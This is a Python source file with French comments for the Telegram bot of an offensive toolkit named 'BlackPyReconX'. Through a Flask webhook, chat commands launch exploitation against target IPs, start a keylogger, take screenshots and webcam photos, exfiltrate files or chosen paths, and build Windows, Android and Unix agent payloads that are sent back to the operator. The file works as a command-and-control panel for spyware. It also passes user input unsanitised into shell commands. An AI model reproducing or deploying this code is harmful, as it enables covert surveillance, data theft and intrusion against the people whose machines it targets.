# telegram_bot/telegram_bot.py

import os
import asyncio
from pathlib import Path
from flask import Flask, request
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from modules.utils import get_api_keys

# === 🔐 Clés API
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")

# === 📁 Répertoires
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
SCREENSHOTS = OUTPUTS / "screenshots"
BUILD_DIR = BASE_DIR / "build" / "dist"

# === 📲 Flask App (Webhook)
app = Flask(__name__)

# === 🧩 Fonctions de commande
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
        "🔍 `/osint <ip|domaine>`\n"
        "🛠️ `/scan <ip>`\n"
        "💥 `/exploit_sys <ip>`\n"
        "📸 `/screenshot`\n"
        "🎹 `/keylogger_start`\n"
        "📷 `/webcam_snap`\n"
        "📤 `/exfiltrate`\n"
        "📂 `/exfiltrate_path <chemin>`\n"
        "🧾 `/rapport`\n"
        "💣 `/set_payload <windows|android|unix>`\n",
        parse_mode=ParseMode.MARKDOWN
    )

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /osint <ip ou domaine>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --osint")
    path = OUTPUTS / "osint.txt"
    await send_file_or_error(update, path, "❌ Fichier OSINT introuvable.")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /scan <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --scan")
    path = OUTPUTS / "scan_results.txt"
    await send_file_or_error(update, path, "❌ Résultats de scan introuvables.")

async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exploit_sys <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --exploit_sys")
    await update.message.reply_text("✅ Exploitation système lancée.")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --screenshot")
    path = SCREENSHOTS / "screenshot_latest.png"
    await send_file_or_error(update, path, "❌ Aucune capture trouvée.")

async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --keylogger")
    await update.message.reply_text("🎹 Keylogger démarré.")

async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --webcam")
    path = SCREENSHOTS / "webcam_latest.png"
    await send_file_or_error(update, path, "❌ Aucune image webcam trouvée.")

async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --exfil")
    path = OUTPUTS / "exfiltrated.zip"
    await send_file_or_error(update, path, "❌ Aucune archive exfiltrée trouvée.")

async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exfiltrate_path <chemin>")
    chemin = " ".join(context.args)
    os.system(f"python main.py --exfiltrate_path \"{chemin}\"")
    chemin_escaped = escape_markdown(chemin, version=2)
    await update.message.reply_text(
        f"📂 Exfiltration de `{chemin_escaped}` terminée.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/reporting.py")
    path = OUTPUTS / "rapport_final.txt"
    await send_file_or_error(update, path, "❌ Rapport introuvable.")

async def set_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] not in ["windows", "android", "unix"]:
        return await update.message.reply_text("❗ Usage : /set_payload <windows|android|unix>")
    target = context.args[0]
    os.system(f"python build/packager.py --target {target}")
    payload_name = {
        "windows": "agent_win.exe",
        "android": "agent_android.py",
        "unix": "agent_linux.py"
    }.get(target)
    payload_path = BUILD_DIR / payload_name
    await send_file_or_error(update, payload_path, "❌ Échec de la génération du payload.")

# 🔧 Utilitaire d'envoi sécurisé de fichiers
async def send_file_or_error(update, path, error_msg):
    if path.exists():
        with open(path, "rb") as f:
            try:
                await update.message.reply_document(document=f)
            except Exception as e:
                print(f"❌ Erreur envoi document : {e}")
                await update.message.reply_text("⚠️ Envoi du fichier échoué.")
    else:
        await update.message.reply_text(error_msg)

# === 🌐 Webhook Render
@app.post("/telegram/webhook")
def telegram_webhook():
    try:
        data = request.get_json(force=True)
        update = Update.de_json(data, bot=None)
        app_ = ApplicationBuilder().token(TOKEN).build()

        # Ajout dynamique des handlers à chaque requête
        app_.add_handler(CommandHandler("menu", menu))
        app_.add_handler(CommandHandler("osint", osint))
        app_.add_handler(CommandHandler("scan", scan))
        app_.add_handler(CommandHandler("exploit_sys", exploit_sys))
        app_.add_handler(CommandHandler("screenshot", screenshot))
        app_.add_handler(CommandHandler("keylogger_start", keylogger_start))
        app_.add_handler(CommandHandler("webcam_snap", webcam_snap))
        app_.add_handler(CommandHandler("exfiltrate", exfiltrate))
        app_.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
        app_.add_handler(CommandHandler("rapport", rapport))
        app_.add_handler(CommandHandler("set_payload", set_payload))

        async def process():
            await app_.initialize()
            await app_.process_update(update)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process())
        loop.close()

        return "OK", 200

    except Exception as e:
        print(f"❌ Erreur webhook : {e}")
        return "Erreur serveur", 500
